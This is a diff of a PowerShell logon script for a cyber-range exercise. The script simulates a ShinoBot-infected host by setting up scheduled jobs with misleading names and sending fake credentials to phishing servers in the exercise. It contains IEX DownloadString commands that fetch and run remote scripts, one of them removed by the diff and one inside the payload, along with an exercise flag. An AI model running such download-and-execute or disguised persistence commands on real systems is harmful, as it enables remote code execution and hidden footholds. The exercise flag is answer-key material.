@@ -1,13 +1,25 @@
-﻿#
-# Commands to startup Shinobot. Store at C:\Windows\system32\sb\sb_start.ps1
-#
-Remove-Item -Path "HKCU:\Software\ShinoBOT5" -Recurse
-IEX (New-Object Net.WebClient).DownloadString('https://shinobotps1.com/download_get.php')
+﻿<#
+reveal-shinobot - A logon script for the Arena 1 in the UA Little Rock Cyber Gym.
+ 
+This script starts shinobot and starts simulating authentication attempts using the ShinoBot 
+credentials. Arena 1 includes a social engineering toolkit to capture credentials.
+Users are intended to use the credentials on shinobotps1.com to deduct points in the
+Arena. This script will continue to execute and try to send the credential payload to every
+social engineering toolkit webserver in the Arena.
 
++---------------------------------------------------------------------------------------------+ 
+| ORIGIN STORY                                                                                | 
++---------------------------------------------------------------------------------------------+ 
+|   DATE        : 2020-11-30
+|   AUTHOR      : Philip Huff 
+|   DESCRIPTION : Initial Draft 
++---------------------------------------------------------------------------------------------+ 
 
-#
-# Commands to continuously send web authentication traffic to the phishing web server.
-#
++ Commands to set the startup job. The name is intended to be misleading.
+$trigger = New-JobTrigger -AtLogon
+Register-ScheduledJob -Trigger $trigger -FilePath C:\Windows\System32\sb\sb.ps1 -Name NetworkHealth
+#>
+
 function testport ($hostname, $port=80, $timeout=100) {
   $requestCallback = $state = $null
   $client = New-Object System.Net.Sockets.TcpClient
@@ -19,9 +31,13 @@ function testport ($hostname, $port=80, $timeout=100) {
   [pscustomobject]@{hostname=$hostname;port=$port;open=$open}
 }
 
+Unregister-ScheduledJob -Name GetBatteryStatus
+Register-ScheduledJob -RunNow -FilePath C:\Windows\System32\sb\sb_start.ps1 -Name GetBatteryStatus
+
+Start-Sleep -Seconds 60
 $shinohid = Get-ItemProperty -Path HKCU:\Software\ShinoBOT5 -Name HID
 $shinopid = Get-ItemProperty -Path HKCU:\Software\ShinoBOT5 -Name PID
-$Payload = @{"username"=$shinohid.HID; "password"=$shinopid.PID; "instructions"="Nice work. The flag is CyberGym{Phish are biting} now go to shinobotps1.com to deduct points from your opponents. Run the command: IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/emerginganalytics/ualr-cyber-gym/master/workout-scripts/auto-assess/arena-deduct.ps1'); Invoke-Arena1-Deduct;"}
+$Payload = @{"username"=$shinohid.HID; "password"=$shinopid.PID; "instructions"="Nice work. The flag is CyberGym{phish are biting} now go to shinobotps1.com to deduct points from your opponents. Run the command: IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/emerginganalytics/ualr-cyber-gym/master/workout-scripts/auto-assess/arena-deduct.ps1'); $return = Invoke-Arena1-Deduct | ConvertFrom-Json; $return;"}
 
 while ($true)
 {
@@ -38,11 +54,3 @@ while ($true)
         }
     }
 }
-
-# 
-# Commands to set the startup job
-#
-$trigger = New-JobTrigger -AtStartup -RandomDelay 00:00:30
-Register-ScheduledJob -Trigger $trigger -FilePath C:\Windows\System32\sb\sb_start.ps1 -Name GetBatteryStatus
-$trigger2 = New-JobTrigger -AtStartup -RandomDelay 00:02:00
-Register-ScheduledJob -Trigger $trigger2 -FilePath C:\Windows\System32\sb\sb.ps1 -Name HealthMonitor
